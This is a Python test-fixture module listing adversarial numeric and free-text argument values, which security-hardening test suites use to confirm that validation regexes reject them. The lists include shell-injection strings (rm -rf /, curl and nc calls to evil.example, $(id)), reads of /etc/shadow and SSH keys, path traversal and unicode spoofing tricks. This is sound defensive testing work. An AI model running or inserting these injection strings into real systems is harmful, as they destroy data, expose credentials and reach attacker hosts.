"""Adversarial argument fixtures shared across security-hardening test suites.

Downstream `tests/<skill>/test_argument_validation.py` test suites (added by
specs 37–40) will import the constants here and parameterize their validation
assertions across them. New attack vectors should be added to the appropriate
constant rather than duplicated per skill.
"""

# Adversarial values to feed where a NUMERIC argument is expected
# (PR numbers, --max counts, etc.). The skill's validation regex must reject
# every entry here.
ADVERSARIAL_ARGS = [
    # Shell metacharacters
    "1; rm -rf /",
    "1 && curl evil.example/x",
    "1`whoami`",
    "1$(id)",
    "1|nc evil.example 9",
    "1 > /etc/passwd",
    "1 < /etc/shadow",
    "1 & echo bg",
    # Globs / paths
    "*",
    "~/.ssh/id_rsa",
    "../../etc/passwd",
    # Whitespace / control chars
    "1\nmalicious",
    "1\rmalicious",
    "1\tmalicious",
    "  ",
    "\t",
    "",
    # Disallowed numeric values / formats (regex must reject each)
    "abc",
    "--malicious",
    "-1",
    "0",
    "1.5",
    "1e10",
    "0x1",
    # Unicode / homoglyphs (use \uXXXX escapes; raw glyphs render invisibly in
    # most editors and cspell/lint tooling, so the escape form is unambiguous).
    "\uFF11",        # fullwidth digit one
    "1\u200B",       # trailing zero-width space
    "1\u2013",       # en-dash splice
    "\u202E1",       # RTL override prefix
    # Oversized
    "1" * 10_000,
]

# Adversarial values to feed where a FREE-TEXT argument is expected
# (branch names, focus topics, file paths). The skill's validation regex
# (typically a character allowlist) must reject every entry here.
ADVERSARIAL_TEXT_ARGS = [
    # Shell metacharacters embedded in otherwise-plausible names
    "main; rm -rf /",
    "main && curl evil.example/x",
    "main`whoami`",
    "main$(id)",
    "main|nc evil.example 9",
    # Spaces and control chars
    "feature branch with spaces",
    "feature\nbranch",
    "feature\tbranch",
    # Path-traversal-flavored
    "../../etc/passwd",
    "$HOME/.ssh/id_rsa",
    # Unicode / homoglyphs (escape form, see note above). Letters that follow
    # a `\uXXXX` escape are concatenated separately so spellcheckers do not see
    # a single "escape + letters" token (cspell would otherwise flag the
    # joined identifier as an unknown word).
    "main" + "\u200B",    # zero-width space
    "\u202E" + "main",    # RTL override prefix
    # Empty / whitespace-only
    "",
    "  ",
    "\t",
    # Oversized
    "a" * 10_000,
]
